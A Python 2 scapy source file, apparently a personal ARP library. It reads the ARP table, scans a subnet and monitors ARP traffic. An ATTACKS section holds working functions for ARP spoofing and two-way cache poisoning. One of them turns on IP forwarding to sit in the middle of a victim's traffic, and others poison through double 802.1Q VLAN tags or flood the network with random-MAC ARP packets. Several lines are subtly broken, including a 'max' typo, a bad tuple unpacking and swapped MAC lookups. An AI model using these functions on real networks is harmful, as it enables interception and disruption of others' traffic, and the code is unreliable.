#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# Dumb ARP library by @090h


# import scapy silently
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0

# basic requirements
from os import path, geteuid
from subprocess import Popen, PIPE
from argparse import ArgumentDefaultsHelpFormatter, ArgumentParser
from pprint import pprint
import signal

# external dependencies
from ipcalc import Network
from netifaces import ifaddresses
# netifaces.ifaddresses('lo0')


# Other script requirements
from mac import get_mac, lookup_mac


def table():
    '''
    ARP table
    :return: ARP table as dictionary
    '''
    if LINUX:
        res = {}
        for line in open("/proc/net/arp").readlines():
            if "IP address" in line:
                continue
            (ip, hw, flags, address, mogl, dev) = line.split()
            res[address] = ip
        return res
        # return [line.strip().split() for line in file("/proc/net/arp").readlines()]
    elif DARWIN:
        res = {}
        lines = filter(lambda x: x is not None, Popen('arp -a', shell=True, stdout=PIPE).communicate()[0].split('\n'))
        for line in lines:
            items = line.split(' ')
            if len(items) < 2:
                continue
            ip, mac = items[1].replace('(','').replace(')',''), items[3]
            if max == 'ff:ff:ff:ff:ff:ff':
                continue
            # res[ip] = mac
            res[mac] = ip
        return res
    else:
        raise NotImplemented


def originalMAC(ip):
    ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src

# sending ARP scan
def scan(target):
    return srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target))
    # return srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target))[0]


# ARP scan summary
def arp_summary(target):
    scan(target).summary(lambda (s, r): r.sprintf("%Ether.src% %ARP.psrc%"))


def ping(host, timeout=2, verbose=False):
    res = {}

    alive, dead = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host), timeout=timeout, verbose=1)
    for i in range(0, len(alive)):
        mac = alive[i][1].hwsrc
        ip = alive[i][1].psrc
        print(mac, ip)
        res[mac] = [ip]

    return res


def arp_handler(pkt):
    if not pkt.haslayer(ARP):
        return
    pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
    if pkt[ARP].op == 1:  # who-has (request)
        print("Request: " + pkt[ARP].psrc + " is asking about " + pkt[ARP].pdst)
    if pkt[ARP].op == 2:  # is-at (response)
        print("*Response: " + pkt[ARP].hwsrc + " has address " + pkt[ARP].psrc)


def arp_handler_advanced(pkt):
    MACtest = []
    pktTime = []
    detectTimer = 0
    MACcounter = 0
    timeCounter = 0
    sourceMAC = pkt.sprintf('%ARP.hwsrc%')
    pktTime.append(time.mktime(time.gmtime()))
    pktDif = [pktTime[i + 1] - pktTime[i] for i in range(len(pktTime) - 1)]

    if len(MACtest) < 8:
        MACtest.append(sourceMAC)
        for a in MACtest:
            if a == sourceMAC:
                MACcounter += 1
        if MACcounter == 7:
            for b in pktDif:
                if b == 0:
                    timeCounter += 1
            if timeCounter == 6:
                curTimer = time.mktime(time.gmtime())
                lastDet = curTimer - detectTimer
                print "LAST DETECT: %d" % lastDet
                if lastDet > 30:
                    detectTimer = time.mktime(time.gmtime())
                    print "DETECTED*******************************"
            MACcounter = 0
            timeCounter = 0
    else:
        MACtest = []
        pktTime = []
        print "CLEARED"

    print [pktTime[i + 1] - pktTime[i] for i in range(len(pktTime) - 1)]
    print "MACtest: %s\n" % MACtest


def monitor(func=None):
    print('Starting ARP monitor')
    if func is None:
        return sniff(prn=arp_handler, filter="arp", )
    else:
        return sniff(filter="arp")


################################## ATTACKS #############################################
def spoof(clientMAC, client, gateway):
    send(Ether(dst=clientMAC) / ARP(op="who-has", psrc=gateway, pdst=client), inter=RandNum(10, 40), loop=1)


def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))


def poison_old():
    print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
    my_mac = get_mac()
    if not my_mac:
        print "Cant get local mac address, quitting"
        sys.exit(1)

    packet = Ether() / ARP(op="who-has", hwsrc=my_mac, psrc=sys.argv[2], pdst=sys.argv[1])
    sendp(packet)


def restore(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)


# ARP cache poisoning with double 802.1q encapsulation
def double_poison(clientMAC, client, gateway):
    send(Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2) / ARP(op="who-has", psrc=gateway, pdst=client),
         inter=RandNum(10, 40), loop=1)


def arp_spoof(routerIP, victimIP):
    victimMAC, = originalMAC(routerIP)
    routerMAC = originalMAC(victimIP)
    if routerMAC == None:
        sys.exit("Could not find router MAC address. Closing....")
    if victimMAC == None:
        sys.exit("Could not find victim MAC address. Closing....")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')
    def signal_handler(signal, frame):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
            ipf.write('0\n')
        restore(routerIP, victimIP, routerMAC, victimMAC)
    signal.signal(signal.SIGINT, signal_handler)
    while 1:
        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)


def flood():
    while 1:
        dest_mac = RandMAC()
        src_mac = RandMAC()
        sendp(Ether(src=src_mac, dst=dest_mac) / ARP(op=2, psrc="0.0.0.0", hwsrc=src_mac, hwdst=dest_mac) / Padding(
            load="X" * 18), verbose=0)


def set_static_mac(ip, mac):
    Popen('arp -s %s %s' % (ip, mac), shell=True).wait()


def auto_discovery():


    for iface in get_if_list():
        try:
            mac = get_if_hwaddr(iface)
            ip = get_if_addr(iface)
            # mask = get_network_mask(iface)
            print iface, mac, ip

            pprint(ifaddresses('en0'))
        except:
            continue

    # my_macs = [ ]
    # pprint(my_macs)

    # ifaces = get_if_list()
    # for iface in ifaces:
        # mac = get_mac(iface)
        #


def main():
    parser = ArgumentParser(description='Dummy arp script.', formatter_class=ArgumentDefaultsHelpFormatter)
    parser.add_argument_group()
    parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
    parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
    args = parser.parse_args()
    if geteuid() != 0:
        exit("[!] Please run as root")


if __name__ == '__main__':
    # main()
    print('ARP table:')
    pprint(table())

    # monitor()
    # print(arping('192.168.90.1/24').summary())

    print('ARP discovery...')
    # ans, unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
    ans, unans = arping('192.168.90.1/24')

    ans.summary(lambda (s, r): r.sprintf("%Ether.src% %ARP.psrc%") )
    # arp_summary('192.168.90.1/24')
    #
    # pprint(auto_discovery())
    # pprint(arp_cahe)